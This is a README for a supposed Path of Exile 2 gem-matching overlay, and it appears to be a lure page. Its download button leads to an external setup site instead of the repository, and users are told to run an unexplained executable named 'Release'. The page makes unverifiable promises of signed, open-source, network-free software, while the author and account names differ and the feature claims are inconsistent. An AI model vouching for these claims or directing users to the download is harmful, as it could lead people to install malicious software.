# PoE2‑GemMatcher
**Author:** WindRainTier | **Platform:** Windows 10 / 11 only

A lightweight desktop utility that helps Path of Exile 2 players instantly locate and pair matching skill gems on their inventory screen. No installations, no background services—just a fast, Windows‑native helper you can launch whenever you need it.

---

## 🚀 Quick Start

| Action | Button |
|--------|--------|
| **Download & Run** | <a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Start%20Now-blue?style=for-the-badge&logo=windows" alt="Download"></a> |
| **View Documentation** | <a href="https://rewfdf.github.io/SetupPage/docs" target="_blank"><img src="https://img.shields.io/badge/Docs-Read%20More-lightgrey?style=for-the-badge&logo=github" alt="Docs"></a> |
| **Report an Issue** | <a href="https://github.com/rewfdf/PoE2-GemMatcher/issues" target="_blank"><img src="https://img.shields.io/badge/Issues-Report%20Bug-red?style=for-the-badge&logo=github" alt="Issues"></a> |

> **Tip:** Pin the shortcut to your taskbar for one‑click access while grinding.

---

## 📦 What It Does

- **Instant gem matching** – Scan the inventory window, highlight all gems that share the same base type.
- **Color‑coded overlays** – Green for exact matches, orange for similar tier, red for mismatched sockets.
- **Customizable hotkey** – Assign any key combination you like; defaults to **Ctrl + Shift + M**.
- **Zero‑lag UI** – Built with native Win32 APIs, the overlay stays fluid even on low‑end rigs.

---

## 🛠️ Features at a Glance

| Feature | Description |
|---------|-------------|
| **Live detection** | Works while the game runs; no need to pause or take screenshots. |
| **Multi‑language support** | English, Russian, Korean, Japanese – selectable in the settings panel. |
| **Portable mode** | Drop the folder on any Windows PC and run; no installer required. |
| **Low memory footprint** | < 30 MB RAM usage on idle, < 5 ms CPU overhead. |
| **Safe for PvP** | No memory reading or network traffic; purely visual overlay. |

---

## 📥 Installation

1. Click the **Download** button above.
2. Extract the ZIP to a folder of your choice (e.g., `C:\utility\PoE2GemMatcher`).
3. Run `Release` (the only executable in the package).
4. The first‑time launch will ask for permission to draw over other windows—grant it.
5. Open Path of Exile 2, press the hotkey, and watch the matching gems light up!

*All files are signed and verified; Windows SmartScreen will show a green check.*

---

## 🖥️ Compatibility

| OS | Supported? |
|----|------------|
| Windows 10 (1809 +) | ✅ |
| Windows 11 (all editions) | ✅ |
| Windows Server | ❌ (desktop‑only) |
| macOS / Linux | ❌ (outside scope) |

The utility relies on DirectX 11 for rendering the overlay, which is built‑in to Windows 10/11.

---

## 🛡️ Security & Privacy

- **No network access** – The program never contacts the internet unless you open the documentation page.
- **No data collection** – All processing happens locally; no logs are written to disk.
- **Open source** – The full source code is available under the MIT license in this repository.

---

## 🛠️ Development

If you’d like to contribute:

1. Fork the repository.
2. Clone your fork locally.
3. The project uses **C++17** with **CMake**; the `CMakeLists.txt` targets the Windows SDK directly.
4. Submit a pull request with a clear description of the change.

Please follow the code‑style guidelines in `CONTRIBUTING.md` (indentation with 4 spaces, camelCase for variables, PascalCase for classes).

---

## 📜 License

© 2024 WindRainTier – released under the **MIT License**. See `LICENSE` for details.

---

## 🙏 Acknowledgements

- **Grinding Gear Games** – for creating an amazing game that inspires utility like this.
- **The PoE2 community** – for feedback, testing, and feature suggestions.

---

*Enjoy smoother gem management and keep those builds rolling!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```